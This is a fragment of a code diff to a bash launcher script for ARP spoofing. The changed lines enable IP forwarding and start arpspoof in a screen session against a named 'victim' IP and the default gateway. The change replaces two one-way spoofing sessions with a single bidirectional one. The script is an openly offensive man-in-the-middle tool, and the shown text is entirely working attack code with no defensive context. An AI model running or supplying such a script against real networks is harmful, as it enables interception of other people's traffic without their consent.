@@ -47,16 +47,11 @@ then
 	fi
 fi
 
-echo -e "Victim IP Address:\t\t\t$VICTIM"
-echo -e "Gathering Default Gateway IP Address:\t$GATEWAY"
-echo -e "Gathering Own IP Address:\t\t$SELF"
-
 echo "Starting arpspoof..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo "startup_message off" > $RCFILE
 echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
-echo -e "screen -t Router arpspoof -t $GATEWAY $VICTIM" >> $RCFILE
-echo -e "screen -t Victim arpspoof -t $VICTIM $GATEWAY" >> $RCFILE
+echo -e "screen -t arpspoof arpspoof -r -t $GATEWAY $VICTIM" >> $RCFILE
 echo -e "screen -r -t Main" >> $RCFILE
 
 screen -c $RCFILE
